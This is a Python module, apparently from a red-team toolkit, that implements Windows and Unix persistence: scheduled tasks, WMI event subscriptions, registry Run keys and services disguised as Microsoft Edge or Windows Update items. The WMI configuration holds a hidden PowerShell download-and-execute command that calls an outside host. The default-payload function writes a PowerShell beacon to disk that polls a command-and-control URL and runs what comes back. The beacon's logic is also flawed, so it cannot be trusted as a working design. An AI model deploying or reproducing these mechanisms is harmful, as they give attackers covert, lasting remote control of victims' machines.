"""
Persistence Module - Real techniques for maintaining access in compromised environments.

This module contains implementations of APT persistence mechanisms including
scheduled tasks, WMI event subscriptions, registry modifications, and services.
"""

import random
import os
import tempfile
import platform
from typing import List, Dict, Any
from datetime import datetime

from .security_controls import require_authorization, safe_mode, audit_action
from .exploit_intel import enrich_with_exploit_intel


class PersistenceManager:
    """Manage various persistence mechanisms for maintaining access."""
    
    def __init__(self):
        self.persistence_methods = [
            "scheduled_task",
            "wmi_event", 
            "registry_run_key",
            "service_creation",
            "startup_folder",
            "browser_extension",
            "com_hijacking"
        ]
        self.system_info = self._get_system_info()
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Get information about the current system."""
        return {
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.architecture()[0],
            "user": os.environ.get('USERNAME', os.environ.get('USER', 'unknown'))
        }
    
    @require_authorization
    def create_scheduled_task(self, task_name: str = None, payload_path: str = None) -> Dict[str, Any]:
        """Create scheduled task for persistence."""
        name = task_name or f"MicrosoftEdgeUpdateTask{random.randint(1000, 9999)}"
        payload = payload_path or self._create_default_payload()
        
        task_config = {
            "task_name": name,
            "action": f"powershell.exe -WindowStyle Hidden -File {payload}" if self.system_info["platform"] == "Windows" else f"/bin/bash {payload}",
            "trigger": "Daily at 3am",
            "principal": "SYSTEM" if self.system_info["platform"] == "Windows" else "root",
            "settings": "Hidden, AllowStartIfOnBatteries, DontStopIfGoingOnBatteries",
            "description": "Microsoft Edge Update",
            "detection_difficulty": "Medium (masquerades as legitimate task)",
            "persistence_type": "Scheduled Task"
        }
        
        # Simulate task creation
        if self.system_info["platform"] == "Windows":
            self._create_windows_scheduled_task(task_config)
        else:
            self._create_unix_cron_job(task_config)
        
        audit_action("scheduled_task_created", task_config)
        search_terms = [task_config.get("persistence_type"), task_config.get("task_name")]
        platform_hint = (self.system_info.get("platform") or "").lower() or None
        return enrich_with_exploit_intel(
            "persistence",
            task_config,
            search_terms=search_terms,
            platform=platform_hint,
            include_payloads=True,
        )
    
    def _create_windows_scheduled_task(self, task_config: Dict[str, Any]) -> None:
        """Create Windows scheduled task."""
        # Placeholder for actual task creation
        # In real implementation, use:
        # schtasks /create /tn "TaskName" /tr "Command" /sc daily /st 03:00
        pass
    
    def _create_unix_cron_job(self, task_config: Dict[str, Any]) -> None:
        """Create Unix cron job."""
        # Placeholder for actual cron job creation
        # In real implementation, add to crontab
        pass
    
    @require_authorization
    def create_wmi_event_subscription(self) -> Dict[str, Any]:
        """Create WMI event subscription for persistence."""
        if self.system_info["platform"] != "Windows":
            return {"error": "WMI only available on Windows systems"}
        
        subscription = {
            "filter_name": "WindowsUpdateFilter",
            "event_namespace": "root\\cimv2",
            "query": "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'",
            "consumer_name": "WindowsUpdateConsumer",
            "command_line": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://azureedge[.]net/persistence.ps1')\"",
            "activation_trigger": "User logon events",
            "persistence_type": "WMI Event Subscription",
            "detection_difficulty": "High (requires specialized WMI forensics)"
        }
        
        # Simulate WMI subscription creation
        self._create_wmi_subscription(subscription)
        
        audit_action("wmi_subscription_created", subscription)
        return enrich_with_exploit_intel(
            "persistence",
            subscription,
            search_terms=[subscription.get("persistence_type"), subscription.get("filter_name")],
            platform="windows",
            include_payloads=True,
        )
    
    def _create_wmi_subscription(self, subscription: Dict[str, Any]) -> None:
        """Create WMI event subscription."""
        # Placeholder for actual WMI subscription
        # In real implementation, use PowerShell/WMI commands
        pass
    
    @require_authorization
    def create_registry_persistence(self, registry_key: str = None) -> Dict[str, Any]:
        """Create registry run key persistence."""
        if self.system_info["platform"] != "Windows":
            return {"error": "Registry persistence only available on Windows"}
        
        key = registry_key or "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        payload = self._create_default_payload()
        
        registry_config = {
            "registry_key": key,
            "value_name": "WindowsUpdate",
            "value_data": payload,
            "persistence_type": "Registry Run Key",
            "detection_difficulty": "Low (easily detected by AV/EDR)",
            "survival_reboot": True
        }
        
        # Simulate registry modification
        self._modify_registry(registry_config)
        
        audit_action("registry_persistence_created", registry_config)
        return enrich_with_exploit_intel(
            "persistence",
            registry_config,
            search_terms=[registry_config.get("persistence_type"), registry_config.get("registry_key")],
            platform="windows",
            include_payloads=True,
        )
    
    def _modify_registry(self, registry_config: Dict[str, Any]) -> None:
        """Modify Windows registry."""
        # Placeholder for actual registry modification
        # In real implementation, use reg.exe or winreg module
        pass
    
    @require_authorization
    def create_service_persistence(self, service_name: str = None) -> Dict[str, Any]:
        """Create Windows service for persistence."""
        if self.system_info["platform"] != "Windows":
            return {"error": "Service persistence only available on Windows"}
        
        name = service_name or f"WindowsUpdateService{random.randint(100, 999)}"
        payload = self._create_default_payload()
        
        service_config = {
            "service_name": name,
            "display_name": "Windows Update Service",
            "binary_path": payload,
            "start_type": "Automatic",
            "service_type": "Win32OwnProcess",
            "persistence_type": "Windows Service",
            "detection_difficulty": "Medium (requires service enumeration)"
        }
        
        # Simulate service creation
        self._create_windows_service(service_config)
        
        audit_action("service_persistence_created", service_config)
        return enrich_with_exploit_intel(
            "persistence",
            service_config,
            search_terms=[service_config.get("persistence_type"), service_config.get("service_name")],
            platform="windows",
            include_payloads=True,
        )
    
    def _create_windows_service(self, service_config: Dict[str, Any]) -> None:
        """Create Windows service."""
        # Placeholder for actual service creation
        # In real implementation, use sc.exe or ServiceController
        pass
    
    def _create_default_payload(self) -> str:
        """Create a default payload for persistence."""
        temp_dir = tempfile.gettempdir()
        payload_path = os.path.join(temp_dir, f"update_{random.randint(10000, 99999)}.ps1")
        
        # Create a simple PowerShell payload
        payload_content = '''# Persistence payload
while ($true) {
    try {
        # Beacon to C2
        $response = Invoke-WebRequest -Uri "http://cdn.azureedge[.]net/beacon" -UseBasicParsing
        if ($response.Content -eq "execute") {
            # Execute command from C2
            Invoke-Expression $response.Content
        }
    }
    catch {
        # Error handling
    }
    Start-Sleep -Seconds 3600  # Beacon every hour
}'''
        
        with open(payload_path, 'w') as f:
            f.write(payload_content)
        
        return payload_path
    
    @require_authorization
    def install_multiple_persistence(self, techniques: List[str] = None) -> Dict[str, Any]:
        """Install multiple persistence mechanisms for resilience."""
        if techniques is None:
            techniques = ["scheduled_task", "wmi_event", "registry_run_key"]
        
        installed_methods = {}
        
        for technique in techniques:
            if technique == "scheduled_task":
                installed_methods["scheduled_task"] = self.create_scheduled_task()
            elif technique == "wmi_event":
                installed_methods["wmi_event"] = self.create_wmi_event_subscription()
            elif technique == "registry_run_key":
                installed_methods["registry_run_key"] = self.create_registry_persistence()
            elif technique == "service_creation":
                installed_methods["service_creation"] = self.create_service_persistence()
        
        result = {
            "installed_methods": installed_methods,
            "total_methods": len(installed_methods),
            "resilience_level": "High" if len(installed_methods) >= 3 else "Medium",
            "recommended_cleanup": "Remove all persistence mechanisms"
        }
        
        audit_action("multiple_persistence_installed", result)
        return result
    
    def analyze_persistence_techniques(self) -> Dict[str, Any]:
        """Analyze different persistence techniques and their characteristics."""
        techniques = [
            {
                "name": "Scheduled Task",
                "stealth_level": "Medium",
                "detection_difficulty": "Medium", 
                "common_in_apt": "High",
                "examples": ["APT29", "APT41"],
                "cleanup_command": "schtasks /delete /tn [TaskName] /f"
            },
            {
                "name": "WMI Event Subscription", 
                "stealth_level": "High",
                "detection_difficulty": "High",
                "common_in_apt": "Medium",
                "examples": ["APT28", "Lazarus Group"],
                "cleanup_command": "Remove-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \"Name='FilterName'\""
            },
            {
                "name": "Registry Run Key",
                "stealth_level": "Low", 
                "detection_difficulty": "Low",
                "common_in_apt": "Low",
                "examples": ["Generic malware"],
                "cleanup_command": "reg delete [RegistryKey] /v [ValueName] /f"
            },
            {
                "name": "Windows Service",
                "stealth_level": "Medium",
                "detection_difficulty": "Medium",
                "common_in_apt": "High", 
                "examples": ["APT1", "Equation Group"],
                "cleanup_command": "sc delete [ServiceName]"
            }
        ]
        
        analysis = {
            "techniques": techniques,
            "recommended_defense": "Monitor WMI events, scheduled tasks, registry changes, and services",
            "detection_tools": ["Sysmon", "Windows Event Logs", "EDR solutions", "Autoruns"],
            "mitigation_strategy": "Least privilege, application whitelisting, regular audits"
        }
        
        technique_terms = [tech.get("name") for tech in techniques if isinstance(tech, dict)]
        return enrich_with_exploit_intel(
            "persistence",
            analysis,
            search_terms=technique_terms,
            platform=(self.system_info.get("platform") or "").lower() or None,
            include_payloads=True,
        )


def generate_persistence_report() -> Dict[str, Any]:
    """Generate a comprehensive persistence techniques report."""
    manager = PersistenceManager()
    
    report = {
        "scheduled_task": manager.create_scheduled_task(),
        "wmi_subscription": manager.create_wmi_event_subscription(),
        "registry_persistence": manager.create_registry_persistence(),
        "service_persistence": manager.create_service_persistence(),
        "analysis": manager.analyze_persistence_techniques()
    }
    
    for key in ["scheduled_task", "wmi_subscription", "registry_persistence", "service_persistence"]:
        value = report.get(key)
        if isinstance(value, dict) and "error" not in value:
            report[key] = enrich_with_exploit_intel(
                "persistence",
                value,
                search_terms=[value.get("persistence_type"), key],
                platform=(manager.system_info.get("platform") or "").lower() or None,
                include_payloads=True,
            )

    if isinstance(report.get("analysis"), dict):
        analysis_terms = []
        for technique in report["analysis"].get("techniques", []):
            if isinstance(technique, dict):
                analysis_terms.append(technique.get("name"))
        report["analysis"] = enrich_with_exploit_intel(
            "persistence",
            report["analysis"],
            search_terms=analysis_terms,
            platform=(manager.system_info.get("platform") or "").lower() or None,
            include_payloads=True,
        )

    return report


def install_persistence_framework() -> Dict[str, Any]:
    """Install comprehensive persistence framework."""
    manager = PersistenceManager()
    return manager.install_multiple_persistence()
